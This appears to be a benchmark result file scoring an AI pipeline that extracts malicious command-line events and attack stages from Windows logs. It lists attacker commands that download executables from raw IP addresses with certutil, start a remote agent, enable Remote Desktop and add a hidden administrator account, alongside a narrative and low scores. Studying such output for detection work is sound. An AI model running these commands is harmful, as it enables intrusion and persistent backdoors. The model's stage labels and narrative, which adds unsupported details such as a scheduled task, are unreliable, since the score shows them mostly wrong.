@@ -1,0 +1,80 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd /c taskkill /f /im agent.exe & certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe & cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "tasklist /svc | findstr Ter",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net user oop o33 /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup administrators oop /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "tasklist /svc | find \"Ter\"",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attacker initiated an initial access using crafted URLs to download malware onto the machine, specifically targeting `sangforcat.exe` and another unknown executable via HTTP requests. The downloaded executables were executed on the target machine through a scheduled task (`agent.exe`). Further persistence was achieved by adding a new account to the local admin group and enabling Remote Desktop services without password protection. Additionally, the attacker performed discovery activities such as checking running processes related to terminal server, indicating potential lateral movement capabilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 82148,
+      "completion_tokens": 1690,
+      "total_tokens": 83838,
+      "wall_clock_s": 16.019,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2222222222222222,
+      "recall": 0.2857142857142857,
+      "f1": 0.25,
+      "tp": 2,
+      "fp": 7,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 9,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 82148,
+      "completion_tokens": 1690,
+      "total_tokens": 83838,
+      "wall_clock_s": 16.019,
+      "parse_retries": 0
+    }
+  }
+}
